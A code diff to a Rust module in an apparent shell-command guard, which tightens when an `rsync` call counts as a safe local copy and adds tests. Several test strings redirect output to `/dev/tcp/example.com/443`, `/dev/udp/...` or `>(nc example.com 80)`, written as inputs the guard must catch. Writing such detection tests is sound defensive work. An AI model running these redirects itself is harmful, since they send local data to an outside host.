@@ -7,6 +7,12 @@
 //! as a remote path, and no option that reads rules or file lists this text
 //! never showed.
 //!
+//! The copy may not replace work Git would not restore. `rsync` overwrites
+//! same-named files in an existing destination, so [`replaces_work`] keeps
+//! the review unless the destination is missing or ignored by Git, the bar
+//! `rm -rf` clears, and a redirect that sends output anywhere but
+//! `/dev/null` keeps the file-upload observation ([`local_copy_segment`]).
+//!
 //! `--delete` and its relatives stay out. The destructive-shell rule that
 //! makes `rm -rf` prove its targets are missing or ignored by Git does not
 //! match `rsync`, so a deleting transfer could take committed-but-unpushed
@@ -76,8 +82,13 @@ const LONG_VALUES: [&str; 7] = [
 
 /// Whether `segment` is a local `rsync` copy: described by the options
 /// above and naming two or more operands no shell expansion or remote
-/// spelling could move off this host.
+/// spelling could move off this host, with no redirect that sends a stream
+/// anywhere but `/dev/null` or another stream.
 pub(crate) fn local_copy_segment(segment: &crate::CommandSegmentV1) -> bool {
+    is_rsync(segment) && !redirects_beyond_null(&segment.text) && local_copy(&segment.arguments)
+}
+
+fn is_rsync(segment: &crate::CommandSegmentV1) -> bool {
     segment
         .executable
         .as_deref()
@@ -85,22 +96,27 @@ pub(crate) fn local_copy_segment(segment: &crate::CommandSegmentV1) -> bool {
         == Some("rsync")
         && segment.wrapper_chain.is_empty()
         && !segment.path_overridden
-        && local_copy(&segment.arguments)
 }
 
 /// Whether `arguments` (after `rsync`) are a local copy: described by the
 /// options above and naming two or more operands no shell expansion or
 /// remote spelling could move off this host.
 pub(crate) fn local_copy(arguments: &[String]) -> bool {
+    local_operands(arguments).is_some()
+}
+
+/// The operands of a local copy, destination last, or `None` for any form
+/// [`local_copy`] refuses.
+fn local_operands(arguments: &[String]) -> Option<Vec<&str>> {
     let mut words = arguments.iter();
-    let mut operands = 0;
+    let mut operands = Vec::new();
     let mut options_ended = false;
     while let Some(word) = words.next() {
         if options_ended {
             if !local_operand(word) {
-                return false;
+                return None;
             }
-            operands += 1;
+            operands.push(word.as_str());
             continue;
         }
         if word == "--" {
@@ -115,37 +131,73 @@ pub(crate) fn local_copy(arguments: &[String]) -> bool {
             let name = format!("--{name}");
             if LONG.contains(&name.as_str()) {
                 if joined.is_some() {
-                    return false;
+                    return None;
                 }
                 continue;
             }
             if !LONG_VALUES.contains(&name.as_str()) {
-                return false;
+                return None;
             }
             let value = match joined {
                 Some(value) => value,
-                None => match words.next() {
-                    Some(value) => value.as_str(),
-                    None => return false,
-                },
+                None => words.next()?.as_str(),
             };
             if !inert_value(value) {
-                return false;
+                return None;
             }
             continue;
         }
         if let Some(letters) = word.strip_prefix('-') {
             if letters.is_empty() || !letters.chars().all(|letter| SHORT.contains(letter)) {
-                return false;
+                return None;
             }
             continue;
         }
         if !local_operand(word) {
-            return false;
+            return None;
         }
-        operands += 1;
+        operands.push(word.as_str());
     }
-    operands >= 2
+    (operands.len() >= 2).then_some(operands)
+}
+
+/// Whether `text` redirects a stream anywhere but `/dev/null` or another
+/// stream. A redirect lives in the segment text, not its arguments, and
+/// `>/dev/tcp/<host>/<port>` sends the output to a host. The text is scanned
+/// for the operator characters themselves, wherever they sit in a word, and
+/// anything but a quiet form counts, so a quoted `>` fails closed too.
+fn redirects_beyond_null(text: &str) -> bool {
+    let mut rest = text;
+    while let Some(at) = rest.find(['<', '>']) {
+        let after = &rest[at..];
+        let length = after
+            .chars()
+            .take_while(|c| matches!(c, '<' | '>' | '|' | '&'))
+            .count();
+        let (operator, tail) = after.split_at(length);
+        let tail = tail.trim_start();
+        let target = tail
+            .split(|c: char| {
+                c.is_whitespace() || matches!(c, '<' | '>' | '|' | '&' | ';' | '(' | ')')
+            })
+            .next()
+            .unwrap_or_default();
+        let quiet = match operator {
+            ">" | ">>" | "<" => target == "/dev/null",
+            // `2>&1` and `>&-` duplicate or close a stream; `>&word` names a file.
+            ">&" => {
+                target == "/dev/null"
+                    || target == "-"
+                    || (!target.is_empty() && target.chars().all(|c| c.is_ascii_digit()))
+            }
+            _ => false,
+        };
+        if !quiet {
+            return true;
+        }
+        rest = &tail[target.len()..];
+    }
+    false
 }
 
 /// A pattern or number written out in full. An expansion could hold an
@@ -178,10 +230,34 @@ fn local_operand(word: &str) -> bool {
 
 #[cfg(test)]
 mod tests {
-    use super::local_copy;
+    use super::{local_copy, local_copy_segment, redirects_beyond_null, replaces_work};
 
     fn words(text: &str) -> Vec<String> {
         text.split_whitespace().map(str::to_owned).collect()
+    }
+
+    fn segments(command: &str) -> Vec<crate::CommandSegmentV1> {
+        crate::parse_command(&crate::CommandModelRequestV1 {
+            command: command.to_owned(),
+            dialect: "posix".to_owned(),
+            transport: "shell_string".to_owned(),
+            extraction_provenance: "guard-shell".to_owned(),
+        })
+        .expect("the command parses")
+        .segments
+    }
+
+    /// A workspace holding `src/`, an existing `tracked/` and `dist/`, and a
+    /// `notes.txt` file; `ignored` lists the operands Git would ignore.
+    fn replaces(command: &str, ignored: &[&str]) -> bool {
+        let workspace = tempfile::tempdir().unwrap();
+        for directory in ["src", "tracked", "dist"] {
+            std::fs::create_dir(workspace.path().join(directory)).unwrap();
+        }
+        std::fs::write(workspace.path().join("notes.txt"), "notes\n").unwrap();
+        replaces_work(&segments(command), Some(workspace.path()), &mut |operand| {
+            ignored.iter().any(|candidate| *candidate == operand)
+        })
     }
 
     #[test]
@@ -241,5 +317,107 @@ mod tests {
         ] {
             assert!(!local_copy(&words(text)), "{text}");
         }
+    }
+
+    #[test]
+    fn a_redirect_beyond_dev_null_keeps_the_upload_observation() {
+        for text in [
+            "rsync -a src/ build/ >/dev/tcp/example.com/443",
+            "rsync -a src/ build/ > /dev/tcp/example.com/443",
+            "rsync -a src/ build/ 2>/dev/tcp/example.com/443",
+            "rsync -a src/ build/ >& /dev/tcp/example.com/443",
+            "rsync -a src/ build/ >&/dev/tcp/example.com/443",
+            "rsync -a src/ build/ &>/dev/udp/example.com/53",
+            "rsync -a src/ build/>/dev/tcp/example.com/443",
+            "rsync -a --exclude=tmp>/dev/tcp/example.com/443 src/ build/",
+            "rsync -a src/ build/ < /dev/tcp/example.com/443",
+            "rsync -a src/ build/ >> build.log",
+            "rsync -a src/ build/ &>log",
+            "rsync -a src/ build/ >/dev/null >/dev/tcp/example.com/443",
+            "rsync -a src/ build/ >/dev/null2",
+            "rsync -a src/ build/ >(nc example.com 80)",
+            "rsync -a src/ build/ <<EOF",
+            "rsync -a src/ build/ >",
+        ] {
+            assert!(redirects_beyond_null(text), "{text}");
+        }
+        for text in [
+            "rsync -a src/ build/ >/dev/tcp/example.com/443",
+            "rsync -a src/ build/ 2>/dev/tcp/example.com/443",
+            "rsync -a src/ build/ >& /dev/tcp/example.com/443",
+            "rsync -a src/ build/ >> build.log",
+        ] {
+            let parsed = segments(text);
+            assert!(!local_copy_segment(&parsed[0]), "{text}");
+        }
+    }
+
+    #[test]
+    fn quiet_redirects_leave_the_copy_a_local_one() {
+        for text in [
+            "rsync -a src/ build/",
+            "rsync -a src/ build/ 2>/dev/null",
+            "rsync -a src/ build/ >/dev/null 2>&1",
+            "rsync -a src/ build/ > /dev/null",
+            "rsync -a src/ build/ &>/dev/null",
+            "rsync -a src/ build/ >&/dev/null",
+            "rsync -a src/ build/ </dev/null",
+            "rsync -a src/ build/ 2>&-",
+        ] {
+            assert!(!redirects_beyond_null(text), "{text}");
+            let parsed = segments(text);
+            assert!(local_copy_segment(&parsed[0]), "{text}");
+        }
+    }
+
+    #[test]
+    fn a_new_or_ignored_destination_replaces_nothing() {
+        assert!(!replaces("rsync -a src/ fresh/", &[]));
+        assert!(!replaces("rsync -a src/ dist/", &["dist/"]));
+        assert!(!replaces("rsync -a src/ tracked/ fresh/", &[]));
+        assert!(!replaces("rsync -a src/ fresh/ dist/", &["dist/"]));
+        assert!(!replaces("mkdir -p fresh && rsync -a src/ fresh/", &[]));
+        assert!(!replaces(
+            "rsync -a src/ fresh/ && rsync -a src/ fresh/",
+            &[]
+        ));
+    }
+
+    #[test]
+    fn an_existing_destination_git_does_not_ignore_keeps_review() {
+        assert!(replaces("rsync -a src/ tracked/", &[]));
+        assert!(replaces("rsync -a src/ dist/", &[]));
+        assert!(replaces("rsync -a src/ dist/", &["tracked/"]));
+        assert!(replaces("rsync -a src/ fresh/ tracked/", &["dist/"]));
+        assert!(replaces("rsync -a src/ notes.txt", &[]));
+        assert!(replaces("rsync -a src/ .", &[]));
+        assert!(replaces("mkdir -p tracked && rsync -a src/ tracked/", &[]));
+    }
+
+    #[test]
+    fn nothing_that_could_move_the_destination_runs_before_the_copy() {
+        for command in [
+            "cd src && rsync -a ./ fresh/",
+            "touch fresh && rsync -a src/ fresh/",
+            "mv tracked fresh && rsync -a src/ fresh/",
+            "mkdir -p $DEST && rsync -a src/ fresh/",
+            "X=1; rsync -a src/ fresh/",
+        ] {
+            assert!(replaces(command, &["fresh/", "dist/"]), "{command}");
+        }
+    }
+
+    #[test]
+    fn a_copy_without_a_proof_or_a_directory_keeps_review() {
+        let parsed = segments("rsync -a src/ fresh/");
+        assert!(replaces_work(&parsed, None, &mut |_| true));
+        let remote = segments("rsync -a src/ build.example.com:/srv/app/");
+        assert!(replaces_work(
+            &remote,
+            Some(std::path::Path::new(".")),
+            &mut |_| true
+        ));
+        let other = segments("ls tracked");
+        assert!(!replaces_work(&other, None, &mut |_| false));
     }
 }
